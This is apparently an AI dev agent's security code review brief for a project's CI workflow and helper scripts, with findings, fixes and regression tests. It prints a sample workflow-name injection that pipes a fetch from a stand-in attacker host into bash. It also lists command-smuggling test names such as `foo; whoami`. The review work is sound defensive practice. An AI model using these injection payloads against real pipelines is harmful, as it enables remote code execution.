# Adversarial Code Review Input Document — Sprint 7

**Purpose:** Structured input for an external adversarial reviewer (Murat)
**Date:** 2026-03-03
**Prepared by:** Seven Fortunas Dev Agent (Sprint 7)
**Scope:** Security and reliability review of four production scripts

---

## 1. Scope

### Review This

| File | Purpose | Ref |
|------|---------|-----|
| `.github/workflows/workflow-sentinel.yml` | CI failure detection → classify → retry → issue pipeline | FR-9.1–9.5 |
| `scripts/validate-and-fix-workflow.sh` | Auto-validates and patches generated workflow YAML | FR-10.4 |
| `scripts/validate_github_auth.sh` | Enforces `jorge-at-sf` GitHub account before any `gh` command | Section 5.9, CLAUDE.md |
| `scripts/circuit_breaker.py` | Terminates autonomous agent after 5 consecutive session failures | FR-7.2 |

### Skip These (Out of Scope for This Review)

- `scripts/classify-failure-logs.py` — separate security review in Sprint 8 (API key + prompt injection)
- `tests/` directory — test quality review done by TEA agent
- CI workflows other than `workflow-sentinel.yml`
- Python dependencies / supply chain

---

## 2. Critical Findings

### CRIT-001 — Script Injection via GitHub Actions Expression Interpolation

**File:** `.github/workflows/workflow-sentinel.yml`
**Lines:** 70, 105–112, 147–148, 223–226
**Severity:** CRITICAL — Remote Code Execution potential

**Description:**
GitHub Actions expressions (`${{ ... }}`) are interpolated into the `run:` shell block
BEFORE the shell starts. If a workflow name contains shell metacharacters, this becomes
command injection. Example: a workflow named `foo"$(curl https://attacker.com | bash)"
` would be substituted literally into:

```bash
WORKFLOW_NAME="foo"$(curl https://attacker.com | bash)""
```

All four `run:` steps that use `github.event.workflow_run.name` directly are affected.
The `git commit -m` at line 226 is particularly dangerous because the full expression
`${{ github.event.workflow_run.name }}` is embedded in a double-quoted string with no
sanitization.

**Trigger:** An attacker who can name a GitHub workflow (organization member, repo
contributor, or fork PR) can trigger this.

**Recommended Fix:**
Move all user-controlled expression values into `env:` blocks and reference via
shell variables, never directly in `run:`. GitHub's own hardening guide requires this:

```yaml
- name: Record failure metadata
  env:
    WORKFLOW_NAME: ${{ github.event.workflow_run.name }}
    RUN_ID: ${{ github.event.workflow_run.id }}
  run: |
    # Now $WORKFLOW_NAME is a safe shell env var, not an interpolated expression
    echo "Workflow: $WORKFLOW_NAME"
```

**Regression Test:** See Section 5 — TEST-001.

---

### CRIT-002 — Silent git push Failure Causes Silent Data Loss

**File:** `.github/workflows/workflow-sentinel.yml`
**Lines:** 229–232
**Severity:** CRITICAL — Failure data silently discarded

**Description:**
The "Commit failure data to main branch" step uses:

```yaml
git push origin HEAD:main || echo "Push failed - failure metadata persisted via artifact"
continue-on-error: true
```

When `git push` fails (branch protection, rebase conflict, network error), the failure
is swallowed with a bare `echo`. The `continue-on-error: true` ensures the sentinel
pipeline continues, but:
1. The failure JSONL entry is permanently lost from `compliance/workflow-failures/failures.jsonl`
   (the artifact expires in 7 days)
2. The 24-hour failure count at line 195 becomes incorrect (missed entries = undercounted)
3. No alert is raised — Jorge has no visibility that the sentinel's own data pipeline failed

**Trigger:** Any push to a branch-protected main, concurrent sentinel runs, or
transient GitHub API failures.

**Recommended Fix:**
Replace the silent swallow with a failure signal:

```yaml
git push origin HEAD:main || {
  echo "::error::Sentinel push failed — failure metadata not persisted to git"
  echo "SENTINEL_PUSH_FAILED=true" >> $GITHUB_ENV
  exit 0  # still continue, but flag it
}
```
Then add a summary step that fails the job if `$SENTINEL_PUSH_FAILED == true`.

**Regression Test:** See Section 5 — TEST-002.

---

### CRIT-003 — C2 Auto-Fix Removes Security Guard

**File:** `scripts/validate-and-fix-workflow.sh`
**Lines:** 64–96
**Severity:** CRITICAL — Removes access-control guard from workflows

**Description:**
The C2 auto-fix removes any `if:` condition that references `secrets.*` and replaces
it with `continue-on-error: true`. Example:

Before fix:
```yaml
- name: Deploy to production
  if: secrets.DEPLOY_KEY != ''
  run: deploy.sh
```

After C2 auto-fix:
```yaml
- name: Deploy to production
  # if: secrets.DEPLOY_KEY != ''
  # Auto-fixed C2: replaced with continue-on-error
  continue-on-error: true
  run: deploy.sh
```

This step now runs unconditionally. If `DEPLOY_KEY` is empty, `deploy.sh` runs anyway,
likely failing and printing error messages that may expose deployment target URLs or
partial credentials. More critically, the semantic guard ("only deploy when key is
present") is silently removed.

**Note:** The ORIGINAL reason C2 is flagged is that `secrets.*` in `if:` expressions
can expose secret presence/absence. The correct fix is `env: KEY: ${{ secrets.KEY }}`
with `if: env.KEY != ''`, not `continue-on-error: true`.

**Recommended Fix:**
Remove the C2 auto-fix entirely, or implement the correct fix (rewrite `if: secrets.X`
to `if: env.X` with env block). Document that C2 requires manual review — it is not
safely auto-fixable.

**Regression Test:** See Section 5 — TEST-003.

---

### CRIT-004 — Destructive File Overwrite Without Backup

**File:** `scripts/validate-and-fix-workflow.sh`
**Lines:** 92–93 (C2 fix), 122–123 (C5 fix)
**Severity:** CRITICAL — Permanent data loss on script crash

**Description:**
Both auto-fix routines open the workflow file with `open(workflow_file, 'w')` before
reading the fixed content. Python's file write is not atomic — if the Python process
crashes between `open('w')` and `f.writelines(fixed_lines)`, the workflow file is
truncated to zero bytes. Since `validate-and-fix-workflow.sh` is run inside a CI
container, the original file is lost.

There is no `.orig` backup, no atomic write (`write to tmpfile → rename`), and no
validation that the output file is non-empty before exit.

**Example crash trigger:** OOM kill during Python's `f.writelines()` when processing
a large workflow file on a memory-constrained runner.

**Recommended Fix:**
Use atomic write pattern:
```python
import shutil, tempfile
shutil.copy2(workflow_file, workflow_file + '.orig')
with tempfile.NamedTemporaryFile('w', dir=Path(workflow_file).parent, delete=False) as tmp:
    tmp.writelines(fixed_lines)
    tmp_path = tmp.name
os.rename(tmp_path, workflow_file)  # atomic on POSIX
```

**Regression Test:** See Section 5 — TEST-004.

---

## 3. High Findings

### HIGH-001 — `--force-account` Bypass with No Audit Visibility

**File:** `scripts/validate_github_auth.sh`
**Lines:** 13–14, 56–60
**Severity:** HIGH — Security gate bypass with minimal audit trail

**Description:**
The `--force-account` flag bypasses the `jorge-at-sf` account check and exits 0
regardless of which account is active. The audit log entry reads:
```
VALIDATION_OVERRIDE: Force account flag used with account: jorge-at-gd
```

Problems:
- The calling script, CI workflow, and invocation context are NOT logged
- Any CI workflow or script can silently bypass the gate by appending `--force-account`
- The `coding_prompt.md` STEP 1 check uses this script; if compromised, the
  autonomous agent runs as `jorge-at-gd` and pushes to the wrong org

**Recommended Fix:**
Add caller context to the audit log (e.g., `BASH_SOURCE`, the `GITHUB_RUN_ID` env var,
and the calling PID). Require an explicit reason string: `--force-account --reason "emergency hotfix"`.
Flag this in GITHUB_STEP_SUMMARY when running in CI so Jorge sees the override.

---

### HIGH-002 — Substring Match for Account Name (Spoofable)

**File:** `scripts/validate_github_auth.sh`
**Line:** 51
**Severity:** HIGH — Account validation spoofable by similarly-named accounts

**Description:**
```bash
if echo "${auth_status}" | grep -q "${REQUIRED_ACCOUNT}"; then
```

`grep -q` is a substring search. The account name `jorge-at-sf-evil` or
`jorge-at-sf2` would satisfy this check. If an attacker adds a collaborator to the
org with a name that contains `jorge-at-sf` as a substring, the account check passes
for the wrong account.

This is particularly relevant because the machine has two accounts (`jorge-at-gd` and
`jorge-at-sf`) and the auth status may contain both in some `gh auth status` output formats.

**Recommended Fix:**
Use exact-word match:
```bash
if echo "${auth_status}" | grep -qE "(^|[[:space:]])${REQUIRED_ACCOUNT}([[:space:]]|$)"; then
```
Or better, use `gh api user --jq '.login'` which returns ONLY the current login,
then compare with `==`:
```bash
CURRENT_LOGIN=$(gh api user --jq '.login')
if [[ "$CURRENT_LOGIN" == "$REQUIRED_ACCOUNT" ]]; then
```

---

### HIGH-003 — Silent API Call Failures Pass Empty Logs to Classifier

**File:** `.github/workflows/workflow-sentinel.yml`
**Lines:** 127–128
**Severity:** HIGH — Incorrect classification leads to false issue tickets

**Description:**
```yaml
gh api "repos/${{ github.repository }}/actions/jobs/${JOB_ID}/logs" \
  > "$LOG_FILE" 2>/dev/null || echo "Failed to download logs for job $JOB_ID" > "$LOG_FILE"
```

When the API call fails (token permission, rate limit, job ID expired), the log file
contains the string `"Failed to download logs for job $JOB_ID"`. This text is then
passed verbatim to `classify-failure-logs.py`. The classifier sees "failed" and may
match on "permission denied" patterns, generating a `known_pattern` classification with
`is_retriable: False`, which triggers issue creation for a non-failure (the original
workflow may have already resolved itself).

The `2>/dev/null` suppresses the actual API error, making diagnosis harder.

**Recommended Fix:**
- Remove `2>/dev/null` — log the error to GITHUB_STEP_SUMMARY
- Check log file content before passing to classifier: skip classification if the file
  contains only the error message sentinel string
- Set `create_issue=false` if no valid logs were downloaded for ANY job

---

### HIGH-004 — Shared `/tmp/` Files — Race Condition Under Concurrent Runs

**File:** `.github/workflows/workflow-sentinel.yml`
**Lines:** 89, 112, 122, 599, 676
**Severity:** HIGH — Cross-contamination between concurrent sentinel runs

**Description:**
The sentinel uses multiple fixed `/tmp/` paths:
```
/tmp/failed_jobs.json
/tmp/job_details.json
/tmp/issue_body.md
/tmp/duplicate_comment.txt
/tmp/pr_body.md
/tmp/pr_comment.txt
```

The concurrency group `sentinel-${{ github.event.workflow_run.name }}` prevents
concurrent runs for the SAME workflow name. However, when two DIFFERENT workflows fail
simultaneously (e.g., "Test Suite" and "Deploy Website"), two sentinel instances run
in parallel — potentially on the same GitHub-hosted runner (less likely but possible
with self-hosted runners).

More critically, on self-hosted runners (which Seven Fortunas uses for cost), two
concurrent jobs can share the same runner filesystem. In this case, `/tmp/issue_body.md`
from Run A would be overwritten by Run B's issue body, causing Run A to create an issue
with Run B's content.

**Recommended Fix:**
Use `mktemp` for all temporary files:
```bash
TMP_DIR=$(mktemp -d)
trap 'rm -rf "$TMP_DIR"' EXIT
FAILED_JOBS_FILE="$TMP_DIR/failed_jobs.json"
```

---

### HIGH-005 — `circuit_breaker.py`: No Exception Handling on `feature_list.json` Load

**File:** `scripts/circuit_breaker.py`
**Lines:** 21–26
**Severity:** HIGH — Circuit breaker crashes when it should report

**Description:**
```python
def load_feature_list():
    with open(feature_file, 'r') as f:
        return json.load(f)
```

`generate_summary_report()` calls `load_feature_list()` with no try/except. If
`feature_list.json` is missing (it IS gitignored and absent between sessions), the
function raises `FileNotFoundError` and the summary report is never generated — even
though the circuit breaker just triggered and the report IS the human-readable output
needed for manual intervention.

Additionally, `generate_summary_report()` computes `pass_count/total*100` at line 209
without guarding against `total == 0`, causing `ZeroDivisionError` on an empty feature
list.

**Recommended Fix:**
```python
def load_feature_list():
    if not feature_file.exists():
        return {"features": []}  # safe default
    try:
        with open(feature_file, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, PermissionError) as e:
        print(f"Warning: Could not load feature list: {e}", file=sys.stderr)
        return {"features": []}
```

---

## 4. Medium Findings

### MED-001 — Silent Rebase Conflict Masks Push State

**File:** `.github/workflows/workflow-sentinel.yml`
**Line:** 229
**Severity:** MEDIUM — Failure data may be committed in conflict state

**Description:**
```yaml
git pull --rebase origin main 2>/dev/null || true
git push origin HEAD:main || echo "Push failed ..."
```

If `git pull --rebase` fails due to a conflict, the repo is left in a rebasing state.
The subsequent `git push` will fail (or push conflict markers), but the error is only
logged to stdout. The `2>/dev/null` on the rebase command hides the conflict reason,
making it impossible to diagnose from logs.

**Recommended Fix:**
Remove `2>/dev/null` and handle the rebase failure explicitly:
```bash
if ! git pull --rebase origin main; then
  git rebase --abort
  echo "::warning::Rebase conflict on sentinel push - falling back to artifact only"
fi
```

---

### MED-002 — Hardcoded Absolute Path to Validator

**File:** `scripts/validate-and-fix-workflow.sh`
**Line:** 26
**Severity:** MEDIUM — Script fails on any machine other than ladmin's laptop

**Description:**
```bash
VALIDATOR_PATH="/home/ladmin/seven-fortunas-workspace/7f-infrastructure-project/scripts/validate-workflow-compliance.sh"
```

This absolute path only exists on one specific machine. The script will fail
immediately when run in GitHub Actions, Docker, or any other developer's machine.
The correct approach is to resolve the path relative to the script's own directory.

**Recommended Fix:**
```bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VALIDATOR_PATH="$SCRIPT_DIR/validate-workflow-compliance.sh"
```

---

### MED-003 — `check-circuit-breaker` Step Uses `$WORKFLOW_NAME` in `gh issue list --search`

**File:** `.github/workflows/workflow-sentinel.yml`
**Lines:** 530–534
**Severity:** MEDIUM — Search injection / incorrect issue count

**Description:**
```yaml
ISSUE_COUNT=$(gh issue list \
  --label "ci-failure" \
  --search "in:title \"$WORKFLOW_NAME\"" \
  ...
```

If `WORKFLOW_NAME` contains GitHub search operators (e.g., `repo:`, `label:`, `NOT`,
`AND`, `OR`), the search semantics change. A workflow named `foo OR label:security`
would expand the search to include security-labeled issues not related to CI failures.
This could allow the circuit breaker to count unrelated issues and suppress legitimate
issue creation.

**Recommended Fix:**
Sanitize `WORKFLOW_NAME` before using it in search:
```bash
SAFE_NAME=$(echo "$WORKFLOW_NAME" | tr -d '"' | cut -c1-100)
--search "in:title \"$SAFE_NAME\""
```

---

## 5. Recommended Test Cases

### TEST-001 (for CRIT-001) — Expression Injection in Workflow Name

**Test:** Unit test using a workflow name containing shell metacharacters.
**Assertion:** The sentinel step variable assignment does NOT execute embedded commands.
**Implementation:** Verify that `WORKFLOW_NAME` set via `env:` block prevents injection
by testing with names like `foo"$(id)"`, `foo; whoami`, `foo$(date)`.
**Note:** This cannot be unit-tested without a live runner. Recommend a BATS test that
mocks the GitHub event payload and asserts the shell variable is set literally.

### TEST-002 (for CRIT-002) — Push Failure Detection

**Test:** Mock `git push` to exit 1. Assert the sentinel step detects and signals failure.
**Implementation:** BATS test wrapping the push block with PATH override for `git`.
**Assertion:** Exit code is non-zero OR `GITHUB_ENV` contains `SENTINEL_PUSH_FAILED=true`.

### TEST-003 (for CRIT-003) — C2 Auto-Fix Preserves Security Guard

**Test:** Input a workflow with `if: secrets.DEPLOY_KEY != ''` on a sensitive step.
**Run:** `validate-and-fix-workflow.sh` with C2 violation.
**Assertion:** The step is NOT converted to `continue-on-error: true`. The output
workflow still has a guard that prevents execution when the key is absent.

### TEST-004 (for CRIT-004) — Atomic Write Prevents Corruption

**Test:** Intercept Python's `f.writelines()` mid-write (SIGKILL the process).
**Assertion:** The original workflow file is intact (not zero-byte or truncated).
**Implementation:** Run in a shell test that kills the Python process after starting,
then checks the file size is non-zero.

### TEST-005 (for HIGH-002) — Exact Account Name Matching

**Test:** Authenticate as `jorge-at-sf-notreal` (mocked via `gh auth status` output).
**Run:** `validate_github_auth.sh`.
**Assertion:** Script exits 1 (account not accepted), not 0.
**Implementation:** Override `gh` in PATH with a mock that returns a crafted auth
status containing `jorge-at-sf-notreal`.

### TEST-006 (for HIGH-004) — Concurrent `/tmp/` File Isolation

**Test:** Simulate two sentinel runs in parallel with different workflow names.
**Assertion:** Issue body written by Run A does not contain Run B's workflow name.
**Implementation:** Run two instances of the issue-body-creation block in parallel
with different variables; assert cross-contamination does not occur.

### TEST-007 (for HIGH-005) — Circuit Breaker Report Without feature_list.json

**Test (Python):** Call `generate_summary_report()` with `get_project_root()` pointing
to a `tmp_path` that has NO `feature_list.json`.
**Assertion:** Function returns a path (does not raise), and the report file exists
with meaningful content.
**Current behaviour:** Raises `FileNotFoundError` — this test will fail until the fix
is applied.

---

## 6. Questions for the Reviewer

These items were flagged as unclear or requiring external judgment:

**Q1:** Is the `workflow_run` event's `name` field controlled by the repository owner
only, or can a PR author from a fork trigger it? If a fork PR triggers CI, does the
workflow name come from the fork's `.github/workflows/*.yml`? If yes, CRIT-001 is
exploitable by any contributor with fork-PR capability.

**Q2:** The `--force-account` flag exits 0 without the correct account. Is there any
monitoring (GitHub audit log, SIEM) that would catch this bypass? If not, is the
assumption that `jorge-at-gd` can never have Write access to `Seven-Fortunas-Internal`
repos correct, or could a mis-configured collaborator setting allow it?

**Q3:** The C2 auto-fix was built to handle a specific validation rule. Is C2 actually
enforced for a good reason (preventing accidental secret exposure) or is it a false
positive from the validator? If it's a false positive, the right fix is to relax the
validator rule, not to remove the `if:` guard.

**Q4:** On GitHub-hosted runners (`ubuntu-latest`), do concurrent jobs from the same
workflow ever share a runner? If yes, HIGH-004 (`/tmp/` sharing) applies even without
self-hosted runners. If no, HIGH-004 severity can be downgraded to LOW for cloud-only
deployments.

**Q5:** The `generate_summary_report()` function writes to `autonomous_summary_report.md`
in the project root (which is gitignored territory). Should this report go to
`_bmad-output/archive/` instead? And should it be committed, or just written locally
for the operator to read?
